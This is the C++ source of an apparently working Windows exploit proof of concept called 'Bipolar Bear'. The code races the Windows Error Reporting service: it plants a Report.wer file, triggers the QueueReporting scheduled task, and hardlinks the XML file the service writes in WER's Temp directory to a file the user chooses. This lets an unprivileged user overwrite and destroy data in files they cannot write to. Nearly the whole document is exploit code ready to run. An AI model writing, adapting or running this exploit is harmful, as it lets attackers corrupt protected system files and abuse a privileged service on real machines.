#include <iostream>
#include "stdafx.h"
#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <strsafe.h>
const char* targetfile;
bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);
std::wstring s2ws(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}
DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	LPCWSTR filename1;
	LPCWSTR root = L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\";
	HANDLE hDir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",FILE_LIST_DIRECTORY,FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
	FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];
	DWORD dwBytesReturned = 0;
	std::wstring extension = L".xml";
	std::string targetf(targetfile);
	std::wstring targetfw = s2ws(targetf);
	bool blah = false;
	const wchar_t* targetfww = targetfw.c_str();
	while (TRUE)
	{
		ReadDirectoryChangesW(hDir, (LPVOID)&strFileNotifyInfo, sizeof(strFileNotifyInfo), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &dwBytesReturned, NULL, NULL);
		filename1 = strFileNotifyInfo[0].FileName;
		std::wstring df = std::wstring(root) + filename1;
		std::wstring::size_type found = df.find(extension);
		if (found != std::wstring::npos)
		{
			LPCWSTR dfc = df.c_str();
			do
				{
				blah = CreateNativeHardlink(dfc,targetfww);
				} while (blah == false);
				return 0;
		}
	}
	return 0;
}
void runme() {
	HANDLE mThread = CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);
}
int main(int argc, const char * argv[])
{
	if (argc < 2) {
		std::cout << std::endl << "Please include a filepath as first parameter";
		return 0;
	}
	DWORD dwFileSize = 0;
	DWORD dwFileSize2 = 0;
	targetfile = argv[1];
	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		std::cout << std::endl << "I do not have read permissions for this file or file does not exist";
		return 0;
	}
	dwFileSize = GetFileSize(hFile, NULL);
	dwFileSize2 = dwFileSize;
	CloseHandle(hFile);
	std::cout << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶§§§§§§§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶§1``````````````11§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶1````````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶§```````````````````````````````§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶§```````````````````````````````````1§¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶§```````````````````````````````````````1§¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶``````````BIPOLAR BEAR`````````````````````1§¶¶¶¶¶¶//" << std::endl
		<< "//¶1`1`````````````````````````````````````````1`1¶¶¶¶¶//" << std::endl
		<< "//¶§¶¶§````````````````````````````````````````````1§¶¶//" << std::endl
		<< "//¶¶¶`§§```````````````````````````````````````````§¶¶¶//" << std::endl
		<< "//¶¶1``1§````````````````````````111§§¶¶¶¶¶¶§§§¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶````1§`````````````````````1§§¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶§``````§````````11`````````§§``1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶``````1¶¶```````¶¶¶¶1`````¶1````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶`````§¶¶¶¶1`````¶¶¶¶§````¶¶1````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//§````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶`````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶````§¶¶¶¶¶¶````1¶¶¶¶§````¶¶¶¶````1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶111`11¶¶¶¶1``````1¶¶§````1§¶¶1````11¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "//¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶//" << std::endl
		<< "/////////////////////////////////////////////////////////" << std::endl;
	std::cout << std::endl << "---------------------------------BIPOLAR BEAR SALUTES YOU------------------------------------------------------------" << std::endl;
	Sleep(2000);
	do {

		CreateDirectoryW(L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\1_1_1_1_1", NULL);
		CopyFileW(L"Report.wer", L"c:\\programdata\\microsoft\\windows\\wer\\reportqueue\\1_1_1_1_1\\Report.wer", true);
		runme();
		system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
		HANDLE hFile2 = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile2 != INVALID_HANDLE_VALUE)
		{
			dwFileSize2 = GetFileSize(hFile2, NULL);
		}
		CloseHandle(hFile2);
	} while (dwFileSize == dwFileSize2);
	std::cout << std::endl << "---------------------------------DATA IN FILE SUCCESSFULLY DESTROYED - Press key to exit------------------------------";
	getchar();
}
